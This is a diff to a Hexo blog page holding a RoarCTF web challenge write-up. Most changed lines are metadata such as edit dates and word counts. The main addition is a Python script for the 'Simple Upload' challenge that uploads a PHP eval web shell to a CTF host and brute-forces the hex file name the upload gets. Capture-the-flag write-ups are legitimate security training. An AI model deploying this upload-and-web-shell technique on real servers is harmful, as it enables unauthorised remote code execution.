@@ -67,7 +67,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572273442458.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572353748785.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572353979564.png">
-<meta property="og:updated_time" content="2019-10-29T14:03:47.437Z">
+<meta property="og:updated_time" content="2019-11-04T09:24:52.178Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572272252121.png">
   <link rel="canonical" href="https://li1m.github.io/2019/10/28/Roarctf-Web-writeup/">
@@ -296,7 +296,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-10-29 22:03:47" itemprop="dateModified" datetime="2019-10-29T22:03:47+08:00">2019-10-29</time>
+                <time title="Modified: 2019-11-04 17:24:52" itemprop="dateModified" datetime="2019-11-04T17:24:52+08:00">2019-11-04</time>
               </span>
             
           
@@ -318,7 +318,7 @@
               
                 <span class="post-meta-item-text">Symbols count in article: </span>
               
-              <span>1.6k</span>
+              <span>2.2k</span>
             </span>
           
             <span class="post-meta-item" title="Reading time">
@@ -328,7 +328,7 @@
               
                 <span class="post-meta-item-text">Reading time &asymp;</span>
               
-              <span>1 mins.</span>
+              <span>2 mins.</span>
             </span>
           
 
@@ -361,6 +361,12 @@
 <p><img src="1572353979564.png" alt="1572353979564"></p>
 <p>找到flag文件的关键位置，然后读这个文件，有段base64编码，解码就是flag。</p>
 <p>3.Simple Upload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://1a79e33d-c12c-48e5-b33c-48345ac7056f.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line">path = url + <span class="string">"/index.php/home/index/upload"</span></span><br><span class="line">files = &#123;<span class="string">"file"</span>:(<span class="string">"a.txt"</span>,<span class="string">'a'</span>), <span class="string">"file1"</span>:(<span class="string">"a.php"</span>, <span class="string">'&lt;?php eval($_GET["a"]);'</span>)&#125;</span><br><span class="line">r = requests.post(path, files=files)</span><br><span class="line">t1 = r.text.split(<span class="string">"/"</span>)[<span class="number">-1</span>].split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> (t1)</span><br><span class="line">t1 = int(t1, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> (t1)</span><br><span class="line"></span><br><span class="line">j = t1</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    path = url + <span class="string">"/Public/Uploads/2019-11-04/%s.php"</span> % hex(j)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(path, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">print</span> (path)</span><br><span class="line">        <span class="keyword">print</span> (r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> (j, hex(j)[<span class="number">2</span>:<span class="number">-1</span>], r.status_code)</span><br><span class="line">    j -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
 
     </div>
 
@@ -504,14 +510,14 @@
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
     
-    <span title="Symbols count total">9k</span>
+    <span title="Symbols count total">10k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
     
-    <span title="Reading time total">8 mins.</span>
+    <span title="Reading time total">9 mins.</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
   </div>
